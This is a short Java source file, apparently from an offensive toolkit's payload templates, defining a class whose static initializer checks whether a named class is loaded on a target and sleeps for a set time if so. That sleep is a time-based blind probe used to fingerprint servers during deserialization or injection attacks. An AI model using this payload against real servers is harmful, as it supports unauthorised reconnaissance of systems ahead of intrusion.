package cn.butler.thirdparty.payloads.Template;

public class ServerDetectorSleepTemplate {
    public static String className;
    public static int seconds;

    static {
        new ServerDetectorSleepTemplate();
    }

    public ServerDetectorSleepTemplate() {
        delayIfClassExists();
    }

    public static void delayIfClassExists() {
        try {
            Class.forName(className, false, Thread.currentThread().getContextClassLoader());
            Thread.sleep(seconds * 1000L);
        } catch (ClassNotFoundException e) {
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
